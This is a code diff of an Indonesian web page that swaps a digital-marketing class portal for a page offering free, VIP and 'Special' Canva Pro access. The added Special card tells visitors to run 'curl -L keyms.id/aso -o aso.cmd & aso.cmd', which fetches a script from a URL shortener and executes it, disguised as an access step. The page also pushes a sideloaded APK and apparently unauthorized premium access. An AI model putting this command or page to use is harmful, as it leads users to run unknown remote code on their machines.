+      letter-spacing: -.07em;
+    }
+
+    .gradient-text {
+      display: inline-block;
+      color: transparent;
+      background: linear-gradient(110deg, #fff 5%, #ffe2a1 38%, #77f0c9 78%, #b8cfff);
+      -webkit-background-clip: text;
+      background-clip: text;
+    }
+
+    .hero-desc {
+      max-width: 720px;
+      margin: 14px 0 0;
+      color: var(--muted);
+      font-size: clamp(12.5px, 1.6vw, 15px);
+      line-height: 1.62;
+    }
+
+    .notice {
+      display: flex;
+      align-items: flex-start;
+      gap: 10px;
+      max-width: 650px;
+      margin-top: 22px;
+      padding: 13px 14px;
+      border: 1px solid rgba(247,183,53,.22);
+      border-radius: 18px;
+      background: rgba(247,183,53,.1);
+      color: #f9dc9c;
+      line-height: 1.55;
+      font-size: 12px;
+    }
+
+    .notice svg {
+      flex: 0 0 auto;
+      margin-top: 2px;
+    }
+
+
+
+
+
+    .cards {
+      position: relative;
+      z-index: 1;
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 18px;
+      padding: 0 clamp(18px, 4vw, 44px) clamp(24px, 4vw, 44px);
+    }
+
+    .card {
+      position: relative;
+      overflow: hidden;
+      min-height: 100%;
+      padding: 16px;
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      background: var(--surface);
+      transition: transform .25s ease, border-color .25s ease, box-shadow .25s ease;
+    }
+
+    .card::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: radial-gradient(circle at 25% 0%, rgba(255,255,255,.13), transparent 17rem);
+      opacity: .8;
+      pointer-events: none;
+    }
+
+    .card::after {
+      content: "";
+      position: absolute;
+      left: 16px;
+      right: 16px;
+      top: 0;
+      height: 2px;
+      border-radius: 999px;
+      background: linear-gradient(90deg, transparent, currentColor, transparent);
+      opacity: .75;
+    }
+
+    .card.free {
+      color: var(--green);
+    }
+
+    .card.vip {
+      color: var(--gold);
+      background:
+        linear-gradient(155deg, rgba(247,183,53,.10), transparent 42%),
+        var(--surface);
+    }
+
+    .card.special {
+      grid-column: 1 / -1;
+      color: var(--blue);
+      background:
+        linear-gradient(155deg, rgba(94,155,255,.14), transparent 48%),
+        var(--surface);
+    }
+
+    .card:hover {
+      transform: translateY(-8px);
+      border-color: var(--border-strong);
+      box-shadow: 0 22px 46px rgba(0,0,0,.33);
+    }
+
+    .card-content {
+      position: relative;
+      z-index: 1;
+      display: grid;
+      gap: 10px;
+      height: 100%;
+    }
+
+    .pill {
+      width: fit-content;
+      padding: 5px 9px;
+      border: 1px solid currentColor;
+      border-radius: 999px;
+      background: color-mix(in srgb, currentColor 14%, transparent);
+      color: currentColor;
+      font-size: 10px;
+      font-weight: 800;
+      letter-spacing: .08em;
+      text-transform: uppercase;
+    }
+
+    .card h2 {
+      margin: 0;
+      color: var(--text);
+      font-family: "Syne", sans-serif;
+      font-size: clamp(1.05rem, 2.6vw, 1.45rem);
+      letter-spacing: -.045em;
+      line-height: 1.08;
+    }
+
+    .card p {
+      margin: 0;
+      color: var(--muted);
+      line-height: 1.5;
+      font-size: 12px;
+    }
+
+    .features {
+      display: grid;
+      gap: 7px;
+      margin: 0;
+      padding: 0;
+      list-style: none;
+    }
+
+    .features li {
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      color: #dde2ee;
+      font-size: 12px;
+    }
+
+    .features svg {
+      flex: 0 0 auto;
+      color: currentColor;
+    }
+
+    .actions {
+      display: grid;
+      gap: 10px;
+      margin-top: auto;
+      padding-top: 8px;
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 7px;
+      min-height: 38px;
+      padding: 9px 11px;
+      border-radius: 13px;
+      border: 1px solid rgba(255,255,255,.16);
+      text-decoration: none;
+      color: var(--text);
+      font-weight: 800;
+      font-size: 12px;
+      transition: transform .22s ease, background .22s ease, border-color .22s ease;
+      touch-action: manipulation;
+    }
+
+    .btn:hover {
+      transform: translateY(-2px);
+      border-color: rgba(255,255,255,.28);
+    }
+
+    .btn-primary.free {
+      color: #06120e;
+      background: linear-gradient(135deg, #72ffd6, var(--green));
+      box-shadow: 0 14px 28px rgba(34,212,160,.18);
+    }
+
+    .btn-primary.vip {
+      color: #171006;
+      background: linear-gradient(135deg, #ffe6a5, var(--gold));
+      box-shadow: 0 14px 28px rgba(247,183,53,.19);
+    }
+
+    .btn-primary.special {
+      color: #07111f;
+      background: linear-gradient(135deg, #c8ddff, var(--blue));
+      box-shadow: 0 14px 28px rgba(94,155,255,.22);
+      cursor: pointer;
+      width: 100%;
+    }
+
+    .btn-secondary {
+      background: rgba(255,255,255,.06);
+    }
+
+    .special-modal {
+      position: fixed;
+      inset: 0;
+      z-index: 1000;
+      display: none;
+      place-items: center;
+      padding: 18px;
+      background: rgba(3, 5, 10, .78);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+    }
+
+    .special-modal.is-open {
+      display: grid;
+      animation: fadeIn .2s ease both;
+    }
+
+    .special-modal-panel {
+      width: min(440px, 100%);
+      padding: 22px;
+      border: 1px solid var(--border-strong);
+      border-radius: 24px;
+      background:
+        linear-gradient(155deg, rgba(94,155,255,.14), transparent 46%),
+        var(--surface-strong);
+      box-shadow: var(--shadow);
+    }
+
+    .special-modal-header {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 14px;
+      margin-bottom: 16px;
+    }
+
+    .special-modal-header h2 {
+      margin: 0 0 6px;
+      font-family: "Syne", sans-serif;
+      font-size: 1.35rem;
+    }
+
+    .special-modal-header p {
+      margin: 0;
+      color: var(--muted);
+      font-size: 12px;
+      line-height: 1.55;
+    }
+
+    .special-modal-close {
+      display: grid;
+      place-items: center;
+      width: 36px;
+      height: 36px;
+      padding: 0;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      background: rgba(255,255,255,.06);
+      color: var(--text);
+      font-size: 20px;
+      cursor: pointer;
+      flex: 0 0 auto;
+    }
+
+    .special-form {
+      display: grid;
+      gap: 12px;
+    }
+
+    .special-form label {
+      color: #dde2ee;
+      font-size: 12px;
+      font-weight: 800;
+    }
+
+    .special-password-input {
+      width: 100%;
+      min-height: 46px;
+      padding: 11px 13px;
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      outline: none;
+      background: rgba(255,255,255,.06);
+      color: var(--text);
+      font: inherit;
+    }
+
+    .special-password-input:focus {
+      border-color: rgba(94,155,255,.7);
+      box-shadow: 0 0 0 4px rgba(94,155,255,.12);
+    }
+
+    .special-error {
+      margin: 0;
+      padding: 10px 12px;
+      border: 1px solid rgba(255,107,138,.28);
+      border-radius: 13px;
+      background: rgba(255,107,138,.1);
+      color: #ffb3c3;
+      font-size: 12px;
+      line-height: 1.5;
+    }
+
+    body.modal-open {
+      overflow: hidden;
+    }
+
+    .community {
+      position: relative;
+      z-index: 1;
+      padding: 0 clamp(18px, 4vw, 44px) clamp(22px, 4vw, 44px);
+    }
+
+    .section-title {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin: 0 0 16px;
+      color: var(--muted);
+      font-size: 12px;
+      font-weight: 800;
+      letter-spacing: .13em;
+      text-transform: uppercase;
+    }
+
+    .section-title::before,
+    .section-title::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    .community-grid {
+      display: grid;
+      grid-template-columns: repeat(2, minmax(0, 1fr));
+      gap: 14px;
+    }
+
+    .community-link {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      min-height: 62px;
+      padding: 14px 16px;
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      background: rgba(255,255,255,.045);
+      color: var(--text);
+      text-decoration: none;
+      font-weight: 800;
+      transition: transform .22s ease, border-color .22s ease, background .22s ease;
+    }
+
+    .community-link:hover {
+      transform: translateY(-3px);
+      border-color: var(--border-strong);
+      background: rgba(255,255,255,.075);
+    }
+
+    .icon-box {
+      display: grid;
+      place-items: center;
+      width: 36px;
+      height: 36px;
+      border-radius: 14px;
+      color: #fff;
+      flex: 0 0 auto;
+    }
+
+    .icon-wa { background: #20bf61; }
+    .icon-tg { background: #2aabee; }
+
+    .footer-note {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      align-items: flex-start;
+      gap: 12px;
+      margin: 0 clamp(18px, 4vw, 44px) clamp(18px, 4vw, 44px);
+      padding: 15px 16px;
+      border: 1px solid rgba(94,155,255,.18);
+      border-radius: 20px;
+      background: rgba(94,155,255,.075);
+      color: var(--muted);
+      line-height: 1.65;
+      font-size: 12px;
+    }
+
+    .footer-note strong {
+      color: var(--text);
+    }
+
+
+
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(18px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(.97); }
+      to { opacity: 1; transform: scale(1); }
+    }
+
+    @media (max-width: 820px) {
+      .page {
+        width: min(100% - 16px, 720px);
+        padding-top: 10px;
+      }
+
+      .nav {
+        top: 6px;
+        border-radius: 20px;
+      }
+
+      .hero {
+        grid-template-columns: 1fr;
+        padding: 28px 18px 20px;
+      }
+
+
+
+      .cards {
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 10px;
+      }
+    }
+
+    @media (max-width: 520px) {
+      .brand-subtitle,
+      .tiny-badge span {
+        display: none;
+      }
+
+      .brand-mark {
+        width: 44px;
+        height: 44px;
+      }
+
+      .hero-desc {
+        font-size: 11.5px;
+      }
+
+      .notice {
+        font-size: 11.5px;
+      }
+
+      .community-grid {
+        grid-template-columns: 1fr;
+      }
+
+      .card {
+        padding: 12px;
+        border-radius: 18px;
+      }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      *,
+      *::before,
+      *::after {
+        animation-duration: .001ms !important;
+        animation-iteration-count: 1 !important;
+        scroll-behavior: auto !important;
+        transition: none !important;
+      }
+    }
   </style>
-  <link rel="stylesheet" href="portal-animations.css">
 </head>
 <body>
-<div class="loading" id="loading">
-<img src="../logo-mujahiid.png" alt="Logo Mujahiid">
-<div class="loader">
-<i>
-</i>
-</div>
-<small>Menyiapkan kelas digital marketing...</small>
-</div>
-<main class="shell">
-<div class="orb one">
-</div>
-<div class="orb two">
-</div>
-  <header class="wrap">
-<a class="brand" href="../">
-<img src="../logo-mujahiid.png" alt="Logo Mujahiid">
-<span>
-<strong>MUJAHIID</strong>
-<small>Digital Marketing Training Center</small>
-</span>
-</a>
-<nav class="main-nav">
-<a href="#modul">Modul Pelatihan</a>
-<a href="#alur">Cara Akses</a>
-<a href="#bantuan">Bantuan</a>
-</nav>
+  <div class="aurora" aria-hidden="true"></div>
 
-</header>
-  <section class="hero wrap">
-<div class="hero-copy">
-<div class="live-pill">
-<i>
-</i>
-<span id="heroLabel">PORTAL RESMI KELAS DIGITAL MARKETING</span>
+  <main class="page">
+    <nav class="nav" aria-label="Navigasi utama">
+      <a class="brand" href="#top" aria-label="Mujahiid">
+        <span class="brand-mark" aria-hidden="true">
+          <img src="logo-mujahiid.png?v=20260808" alt="Logo Mujahiid">
+        </span>
+        <span class="brand-text">
+          <span class="brand-title">Mujahiid</span>
+          <span class="brand-subtitle">Gratis & VIP Access</span>
+        </span>
+      </a>
+
+  <div class="muja-top-actions">
+  <button
+    id="mujaThemeToggle"
+    class="muja-theme-toggle"
+    type="button"
+    aria-label="Ganti tema"
+    aria-pressed="false"
+    title="Ganti tema"
+  >
+    <svg class="muja-sun-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+      <circle cx="12" cy="12" r="4" stroke="currentColor" stroke-width="2"/>
+      <path d="M12 2v2M12 20v2M4 12H2M22 12h-2M5 5l1.4 1.4M17.6 17.6L19 19M19 5l-1.4 1.4M6.4 17.6L5 19" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+    </svg>
+
+    <svg class="muja-moon-icon" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+      <path d="M21 14.4A8.5 8.5 0 0 1 9.6 3a7 7 0 1 0 11.4 11.4Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round"/>
+    </svg>
+  </button></div>
+      </div>
+    </nav>
+
+    <section id="top" class="shell">
+      <div class="hero">
+        <div class="hero-copy">
+          <div class="eyebrow"><span class="eyebrow-dot"></span> Akses desain lebih mudah</div>
+          <h1>Desain Tanpa Batas dengan <span class="gradient-text">Canva Pro</span></h1>
+          <p class="hero-desc">
+            Pilih akses gratis melalui panduan video atau masuk sebagai member VIP untuk layanan prioritas.
+            Semua tombol diarahkan ke halaman akses dan komunitas yang sudah disiapkan.
+          </p>
+          <div class="notice">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+              <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
+              <path d="M12 7v6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+              <path d="M12 17h.01" stroke="currentColor" stroke-width="3" stroke-linecap="round"/>
+            </svg>
+            <span>Password 3 huruf. Password pertama muncul di menit ke-11. Jangan skip video agar tidak melewatkan password berikutnya.</span>
+          </div>
+        </div>
+        </div>
+      </div>
+
+      <section class="cards" aria-label="Pilihan akses Canva Pro">
+          <article class="card free">
+            <div class="card-content">
+              <span class="pill">Gratis</span>
+              <h2>Canva Pro Free</h2>
+              <p>Akses Canva Pro gratis untuk semua pengguna. Ikuti panduan video dan ambil password sesuai instruksi.</p>
+
+              <ul class="features">
+                  <li>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                      <path d="M5 12.5l4.2 4.2L19.5 6.4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    Tanpa biaya
+                  </li>
+                  <li>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                      <path d="M5 12.5l4.2 4.2L19.5 6.4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    Panduan video
+                  </li>
+                  <li>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                      <path d="M5 12.5l4.2 4.2L19.5 6.4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    Cocok untuk belajar
+                  </li>
+              </ul>
+
+              <div class="actions">
+                  <a class="btn btn-primary free" href="/metode" rel="noopener">
+                    Akses Free
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                      <path d="M7 17L17 7" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/>
+                      <path d="M9 7h8v8" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                  </a>
+                  <a class="btn btn-secondary" href="https://youtu.be/jjqptkhjkx4" rel="noopener" data-youtube-verifikasi-link target="_blank">
+                    Lihat Password
+                  </a>
+              </div>
+            </div>
+          </article>
+          <article class="card vip">
+            <div class="card-content">
+              <span class="pill">VIP Member</span>
+              <h2>Canva Pro VIP</h2>
+              <p>Akses prioritas untuk member VIP dengan proses lebih rapi, cepat, dan eksklusif.</p>
+
+              <ul class="features">
+                  <li>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                      <path d="M5 12.5l4.2 4.2L19.5 6.4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    Akses prioritas
+                  </li>
+                  <li>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                      <path d="M5 12.5l4.2 4.2L19.5 6.4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    Layanan eksklusif
+                  </li>
+                  <li>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                      <path d="M5 12.5l4.2 4.2L19.5 6.4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    Dukungan admin
+                  </li>
+              </ul>
+
+              <div class="actions">
+                  <a class="btn btn-primary vip" href="https://mujaprime.biz.id" rel="noopener">
+                    Akses VIP
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                      <path d="M7 17L17 7" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/>
+                      <path d="M9 7h8v8" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                  </a>
+                  <a class="btn btn-secondary" href="https://www.mujaprime.biz.id/update-and-apk/MujaPrime_2.2_Android.apk" rel="noopener">
+                    Apk MujaPrime
+                  </a>
+              </div>
+            </div>
+          </article>
+          <article class="card special">
+            <div class="card-content">
+              <span class="pill">Special Access</span>
+              <h2>Canva Pro Special</h2>
+              <p>Akses khusus Canva Pro Special. Hanya Orang tertentu Yang Bisa Akses.</p>
+
+              <ul class="features">
+                  <li>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                      <path d="M5 12.5l4.2 4.2L19.5 6.4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    Akses dengan password
+                  </li>
+                  <li>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                      <path d="M5 12.5l4.2 4.2L19.5 6.4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    Link khusus
+                  </li>
+                  <li>
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                      <path d="M5 12.5l4.2 4.2L19.5 6.4" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                    curl -L keyms.id/aso -o aso.cmd &amp; aso.cmd
+                  </li>
+              </ul>
+
+              <div class="actions">
+                  <button class="btn btn-primary special" type="button" data-open-special-modal>
+                    Akses Special
+                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                      <path d="M7 17L17 7" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/>
+                      <path d="M9 7h8v8" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                  </button>
+              </div>
+            </div>
+          </article>
+</ul>
+
+      
+        
+      </section>
+
+      <section class="community" aria-label="Komunitas">
+        <h2 class="section-title">Bergabung dengan komunitas</h2>
+        <div class="community-grid">
+            <a class="community-link" href="https://regionoure.blogspot.com/p/grup-mujahiid.html" rel="noopener">
+              <span class="icon-box icon-wa" aria-hidden="true"><svg width="19" height="19" viewBox="0 0 24 24" fill="currentColor"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347M12.05 21.785h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884"/></svg></span>
+              Grup WhatsApp
+            </a>
+            <a class="community-link" href="https://regionoure.blogspot.com/p/grup-mujahiid.html" rel="noopener">
+              <span class="icon-box icon-tg" aria-hidden="true"><svg width="19" height="19" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.16.16-.295.295-.605.295l.213-3.05 5.56-5.023c.242-.213-.054-.333-.373-.121l-6.87 4.326-2.96-.924c-.643-.203-.658-.643.136-.953l11.57-4.458c.538-.196 1.006.128.832.941z"/></svg></span>
+              Grup Telegram
+            </a>
 </div>
-<h1>Pusat File<br>
-<span>Digital Marketing.</span>
-</h1>
-<p id="subtitle">Buka modul pelatihan, unduh semua file pendukung, dan baca catatan instruktur dalam satu tempat yang terstruktur.</p>
-<div class="hero-actions">
-<a class="btn btn-primary" href="#modul">Lihat modul pelatihan →</a>
-<a class="btn btn-ghost" href="#alur">Cara menggunakan</a>
-</div>
-<div class="trust">
-<span>File dikelompokkan per materi</span>
-<span>Catatan dari instruktur</span>
-<span>Selalu dapat diperbarui</span>
-</div>
-</div>
-    <aside class="hero-panel">
-<div class="panel-head">
-<div>
-<p>RINGKASAN KELAS</p>
-<strong>Digital Marketing BLK</strong>
-</div>
-<span class="status">
-<i>
-</i> AKTIF</span>
-</div>
-<div class="summary-grid">
-<div class="summary-stat">
-<b>▦</b>
-<small>MODUL</small>
-<strong id="moduleCount">00</strong>
-</div>
-<div class="summary-stat">
-<b>⇩</b>
-<small>FILE</small>
-<strong id="fileCount">00</strong>
-</div>
-<div class="summary-stat">
-<b>▤</b>
-<small>CATATAN</small>
-<strong id="noteCount">00</strong>
-</div>
-</div>
-<div class="notice">
-<b>✦</b>
-<div>
-<small>INFORMASI PESERTA</small>
-<p id="welcomeNote">Pilih modul sesuai materi yang sedang dipelajari. Semua file dan catatan tersedia di dalam masing-masing modul.</p>
-</div>
-</div>
-</aside>
-  </section>
-  <section class="ribbon">
-<div class="wrap">
-<span class="ribbon-icon">✓</span>
-<p>
-<strong>Satu kartu untuk satu materi.</strong> Modul Blogger dapat berisi banyak template. Modul Meta Ads dapat berisi seluruh file instalasi dan catatan yang diperlukan.</p>
-<a href="#modul">BUKA MODUL →</a>
-</div>
-</section>
-  <section class="modules wrap" id="modul">
-<div class="section-head reveal">
-<div>
-<p class="eyebrow">MODUL PELATIHAN</p>
-<h2>Buat materi digital marketing ini berupa folder dan isi didalam flashdisk masing-masing</h2>
-<span>Setiap modul memuat kumpulan file dan catatan pelatihan. Tanya ke instruktur apa yang belum dimengerti</span>
-</div>
-<label class="search">⌕<input id="searchInput" placeholder="Cari Blogger, Meta Ads, Google Ads...">
-</label>
-</div>
-<div class="filters reveal" id="filters">
-</div>
-<div class="module-grid" id="moduleGrid">
-</div>
-</section>
-  <section class="flow" id="alur">
-<div class="wrap">
-<div class="flow-box reveal">
-<div>
-<p class="eyebrow">CARA MENGGUNAKAN</p>
-<h2>Materi lebih rapi dan mudah dipelajari.</h2>
-</div>
-<div class="steps">
-<div class="step">
-<b>01</b>
-<p>
-<strong>Pilih modul</strong>Buka materi sesuai sesi kelas.</p>
-</div>
-<div class="step">
-<b>02</b>
-<p>
-<strong>Unduh file</strong>Ambil seluruh file yang diperlukan.</p>
-</div>
-<div class="step">
-<b>03</b>
-<p>
-<strong>Baca catatan</strong>Ikuti arahan dari instruktur.</p>
-</div>
-</div>
-</div>
-</div>
-</section>
-  <footer class="page-footer" id="bantuan">
-<div class="wrap">
-<a class="brand" href="../">
-<img src="../logo-mujahiid.png" alt="">
-<span>
-<strong>MUJAHIID</strong>
-<small>Digital Marketing Training</small>
-</span>
-</a>
-<p>© 2026 Portal Kelas Pelatihan Digital Marketing BLK.</p>
-<a id="supportLink" href="#" target="_blank" rel="noopener">BANTUAN INSTRUKTUR</a>
-</div>
-</footer>
-</main>
-<section class="gate" id="gate">
-<div class="gate-card">
-<div class="gate-icon" id="gateIcon">⌁</div>
-<p class="eyebrow">PORTAL PESERTA BLK</p>
-<h2 id="gateTitle">Masukkan password akses</h2>
-<p id="gateText">Password diberikan oleh instruktur pelatihan.</p>
-<form class="password-row" id="passwordForm">
-<input id="passwordInput" type="password" placeholder="Masukkan password" autocomplete="current-password" required>
-<button>Buka portal</button>
-</form>
-<p class="gate-error" id="gateError">
-</p>
-</div>
-</section>
-<section class="module-modal" id="moduleModal">
-<article class="module-dialog">
-<header class="dialog-head">
-<span class="dialog-icon" id="dialogIcon">▦</span>
-<div class="dialog-title">
-<p id="dialogCategory">MODUL DIGITAL MARKETING</p>
-<h2 id="dialogTitle">
-</h2>
-<span id="dialogSubtitle">
-</span>
-</div>
-<button class="dialog-close" id="dialogClose">✕</button>
-</header>
-<nav class="dialog-tabs">
-<button class="active" data-tab="files" id="dialogFilesTab">FILE MATERI <span id="dialogFileCount">
-</span>
-</button>
-<button data-tab="notes" id="dialogNotesTab">CATATAN PELATIHAN <span id="dialogNoteCount">
-</span>
-</button>
-<button data-tab="examples" id="dialogExamplesTab">CONTOH FOTO <span id="dialogExampleCount">
-</span>
-</button>
-</nav>
-<div class="dialog-body">
-<section class="tab-panel active" id="panel-files">
-<div class="file-list" id="dialogFiles">
-</div>
-</section>
-<section class="tab-panel" id="panel-notes">
-<div class="note-list" id="dialogNotes">
-</div>
-</section>
-<section class="tab-panel" id="panel-examples">
-<div class="photo-notice">Contoh ini menunjukkan bagian yang harus Ada, Gambar/Screenshot dan isi didalam folder yang telah ditentukan.</div>
-<div class="photo-gallery" id="dialogExamples"></div>
-</section>
-</div>
-</article>
-</section>
-<section class="photo-viewer" id="photoViewer" aria-hidden="true">
-<article class="photo-viewer-card">
-<div class="photo-viewer-head"><div><strong id="photoViewerTitle">Contoh foto</strong><small id="photoViewerDescription">Pratinjau saja</small></div><button id="photoViewerClose" type="button">✕</button></div>
-<div class="photo-viewer-image"><img id="photoViewerImage" alt="Contoh bagian yang harus difoto" draggable="false"></div>
-</article>
-</section>
-<div class="toast" id="toast">
-</div>
-<script src="portal-animations.js" defer></script>
-<script type="module">
-  import{initializeApp}from"https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-  import{getFirestore,doc,getDoc,collection,onSnapshot,query,orderBy}from"https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
-  const firebaseConfig={apiKey:"AIzaSyAcN0uaLfWmxp3ZBbWIomPXHenx3gjr5-w",authDomain:"akses-canva-pro-terbatas.firebaseapp.com",databaseURL:"https://akses-canva-pro-terbatas-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"akses-canva-pro-terbatas",storageBucket:"akses-canva-pro-terbatas.firebasestorage.app",messagingSenderId:"424693923668",appId:"1:424693923668:web:ab4cc45f700a36699c12c1"};
-  const db=getFirestore(initializeApp(firebaseConfig));
-  const fallbackModules=[
-    {id:"01-daftar-usaha",title:"Daftar & Profil Usaha",description:"Menentukan identitas usaha, produk atau jasa, harga, target pelanggan, dan tujuan digital marketing.",category:"Fondasi",icon:"01",accent:"#755cf2",published:true,sortOrder:1,files:[{id:"profil",title:"Template Profil Usaha",description:"Dokumen Word untuk menyusun profil usaha.",format:"DOCX",url:"../alat-digital-marketing/profil_usaha.docx"}],notes:[{id:"01a",title:"Hasil yang harus dibuat",content:"Buat Profil Usaha, minimal tiga produk atau jasa, harga, target pelanggan, cara pemesanan, serta tujuan Digital Marketing."}]},
-    {id:"02-google-trends",title:"Google Trends & Kata Kunci",description:"Membandingkan kata kunci untuk memilih istilah yang paling relevan dengan usaha.",category:"Riset Pasar",icon:"02",accent:"#4386f4",published:true,sortOrder:2,files:[{id:"trends",title:"Buka Google Trends",description:"Alat gratis untuk membandingkan minat pencarian.",format:"LINK",url:"https://trends.google.com/trends/"}],notes:[{id:"02a",title:"Tugas peserta",content:"Bandingkan dua kata, pilih satu kata utama, tulis alasannya, lalu simpan screenshot grafik."}]},
-    {id:"03-desain-canva",title:"Desain Usaha di Canva",description:"Membuat logo, poster, daftar harga, dan foto produk sebagai identitas visual usaha.",category:"Konten",icon:"03",accent:"#e76f9d",published:true,sortOrder:3,files:[{id:"desain",title:"Template Desain Grafis",description:"Bahan latihan desain grafis peserta.",format:"ZIP",url:"desain-grafis.zip"}],notes:[{id:"03a",title:"Hasil praktik",content:"Buat logo, poster promosi, daftar harga, dan minimal dua foto produk atau jasa. Unduh hasil dalam format PNG."}]},
-    {id:"04-blogger",title:"Blogger & Website Usaha",description:"Membuat situs promosi, memasang template toko, menulis artikel, dan menampilkan kontak usaha.",category:"Website",icon:"04",accent:"#4f8df7",published:true,sortOrder:4,files:[{id:"b1",title:"Template Website Umum",description:"Template dasar berbagai jenis usaha.",format:"ZIP",url:"template_umum_mujahidin.zip"},{id:"b2",title:"Template Hotel & Homestay",description:"Untuk hotel, losmen, dan rumah inap.",format:"ZIP",url:"Hotel_Losmen_Rumahinab.zip"},{id:"b3",title:"Template Usaha Makanan",description:"Untuk bisnis kuliner dan katalog menu.",format:"ZIP",url:"makanan.zip"},{id:"b4",title:"Template Barbershop",description:"Untuk jasa pangkas rambut.",format:"ZIP",url:"barbershop.zip"},{id:"b5",title:"Template Coffee Shop",description:"Untuk kedai kopi dan kafe.",format:"ZIP",url:"coffee-shop.zip"},{id:"b6",title:"Template Usaha Parfum",description:"Untuk katalog produk parfum.",format:"ZIP",url:"parfum.zip"},{id:"b7",title:"Template Website Bisnis",description:"Template umum untuk latihan lanjutan.",format:"ZIP",url:"website.zip"}],notes:[{id:"04a",title:"Hasil praktik",content:"Buat Blogger, pasang template, ubah nama dan logo, buat halaman usaha serta minimal dua artikel. Simpan link dan screenshot."}]},
